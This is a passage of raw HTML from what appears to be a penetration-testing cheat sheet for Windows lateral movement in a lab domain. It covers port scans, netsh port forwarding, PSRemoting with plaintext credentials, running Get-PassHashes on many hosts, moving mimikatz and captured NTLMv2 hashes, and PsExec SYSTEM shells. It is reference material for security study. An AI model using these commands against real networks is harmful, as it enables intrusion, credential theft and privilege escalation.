class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- FILTERED ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">filteredPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Only open ports&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901,5985&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## In place of host array it is possible to use a subnet (e.g. 192.168.1.0/24)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="port-forwarding">Port forwarding&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Forward a port to another host/port&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">sh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="n">v4tov4&lt;/span> &lt;span class="n">listenport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">80&lt;/span> &lt;span class="n">listenaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span> &lt;span class="n">connectport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">5985&lt;/span> &lt;span class="n">connectaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Note. Use IP addresses and not FQDNs not to trigger Kerberos auth&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-Item&lt;/span> &lt;span class="n">wsman&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Client&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">TrustedHosts&lt;/span> &lt;span class="n">-value&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$securePassword&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">-force&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$credential&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Management&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Automation&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">PsCredential&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$securePassword&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="mf">80&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$securePassword&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show all forwardings&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">show&lt;/span> &lt;span class="n">all&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Delete all forwardings&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">reset&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Delete a specific forwardingnet&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">delete&lt;/span> &lt;span class="n">v4tov4&lt;/span> &lt;span class="n">listenport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">80&lt;/span> &lt;span class="n">listenaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="psremoting">PSRemoting&lt;/h2>
&lt;p>&lt;em>Requires ‘HTTP’ and ‘WSMAN’ SPNs&lt;/em>&lt;/p>
&lt;p>Enable PSRemoting on local machine and adds exception to the firewall:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enable-PSRemoting&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Create a PSSession:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enter a PSSession:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$sess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute commands or scriptblocks:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nb">Get-Process&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">hostname&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute commands with alternative credentials without prompt (useful to solve the double-hop problem):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$securePassword&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">-Force&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$credential&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Management&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Automation&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">PsCredential&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$securePassword&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">hostname&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$credential&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or to start a new session:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$credentialInvoke&lt;/span>&lt;span class="n">-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute scripts from files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-FilePath&lt;/span> &lt;span class="s2">&amp;#34;C:\scripts\Get-PassHashes.ps1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute locally loaded function on the remote machines:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">${&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">Get-PassHashes&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">${&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">Get-PassHashes&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-ArgumentList&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute “Stateful” commands using Invoke-Command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$Sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$Proc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">GetProcess&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$Sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$Proc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Copy files between PSRemoting sessions:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Copy-Item&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="nb">Inveigh-NTLMv2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="n">-Destination&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user01&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-FromSession&lt;/span> &lt;span class="nv">$sess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Copy-Item&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user01&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">mimikatz&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-Destination&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-ToSession&lt;/span> &lt;span class="nv">$sess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="psexec">PsExec&lt;/h2>
&lt;p>Launch a shell on the local machine as DIFFERENT user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\student1&amp;#34;&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\student1&amp;#34;&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Launch a SYSTEM shell on the local machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you get the admin/password of a RID 500 user of a machine, it is possible to get a SYSTEM session on that machine by &lt;code>psexec&lt;/code>. It is also possible to use a &lt;code>cmd&lt;/code> or &lt;code>powershell&lt;/code> session launched from &lt;code>mimikatz&lt;/code> after Pass-The-Hash.&lt;/p>
&lt;p>Execute command in remote computer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD] [COMMAND&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute command ‘netstat -an’ in remote and output result in local computer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">netstat&lt;/span> &lt;span class="n">-an&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute command in remote and output result in remote:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="n">netstat&lt;/span> &lt;span class="n">-an&lt;/span> &lt;span class="p">^&amp;gt;&lt;/span>&lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute program to interact with user:&lt;/p>
